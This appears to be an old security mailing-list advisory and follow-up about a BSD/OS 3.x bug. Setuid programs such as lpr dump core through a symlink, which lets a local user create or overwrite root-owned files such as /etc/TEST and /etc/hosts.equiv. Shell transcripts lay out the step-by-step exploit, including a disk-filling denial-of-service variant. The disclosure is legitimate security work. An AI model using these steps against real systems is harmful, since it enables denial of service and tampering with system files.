@@ -1,0 +1,88 @@
+
+A small and neat bug in BSDi 3.x allows people to arbitrarly write files
+with crap for data, but not overwrite them. Like so:
+
+Have a symbolic link, called [programname].core to desired file. Program
+must be setuid root.
+
+beep[ /tmp ] ls -la lpr.core
+lrwxrwxrwt  1 root  wheel  9 Jun 19 20:30 lpr.core@ -> /etc/TEST
+beep[ /tmp ]
+
+Just to make sure that file doesn't exist :
+
+beep[ /tmp ] ls -la /etc/TEST
+ls: /etc/TEST: No such file or directory
+beep[ /tmp ]
+
+Run program. (In our case lpr is convenient since it waits for tty input
+and suspends itself.)
+
+beep[ /tmp ] lpr &
+[1] 27886
+beep[ /tmp ]
+[1]  + Suspended (tty input)         lpr
+beep[ /tmp ]
+
+
+Kill it with the ABRT signal.
+
+beep[ /tmp ] kill -ABRT %1
+beep[ /tmp ] fg
+lpr
+Abort (core dumped)
+beep[ /tmp ]
+
+And voila :
+
+beep[ /tmp ] ls -la /etc/TEST
+-rw-------  1 root  wheel  184320 Jun 19 20:39 /etc/TEST
+beep[ /tmp ]
+
+
+
+===========================================================================
+
+
+That's a neat "fill up the root partition" denial of service attack.
+It probably works in lots of other operating systems.
+
+It doesn't work in OpenBSD.
+
+
+===========================================================================
+
+
+> A.) BSDi doesn't give a damn that the euid!=ruid, so finding a setgid
+> program with priviliges isn't neccesary.
+>
+> B.) BSDi _does_ however, check if the file exists, so it's quite
+> impossible to overwrite files.
+
+
+Hmm, this is not my experience:
+
+slingshot: {2} % id
+uid=100(ariel) gid=20(staff) groups=20(staff), 0(wheel)
+slingshot: {3} % ls -l /etc/hosts.equiv
+-rw-------  1 root  wheel  0 Jun 20 22:43 /etc/hosts.equiv
+slingshot: {4} % ln -s /etc/hosts.equiv lpr.core
+slingshot: {5} % lpr
+^Z
+Suspended
+slingshot: {6} % kill -ABRT %1
+slingshot: {7} % fg
+lpr
+Abort (core dumped)
+slingshot: {8} % ls -l /etc/hosts.equiv
+-rw-------  1 root  wheel  167936 Jun 20 22:45 /etc/hosts.equiv
+slingshot: {9} % su
+Password:
+Jun 20 22:46:34 slingshot su: ariel to root on /dev/ttyp0
+slingshot: {1} % uname -a
+BSD/OS slingshot.tau.ac.il 3.0 BSDI BSD/OS 3.0 Kernel #0: Mon Jun 16
+19:51:22 IDT 1997
+root@slingshot.tau.ac.il:/usr/src/sys/compile/SLINGSHOT  i386
+
+It wont work if the target file is *not* mode 0600 .
+
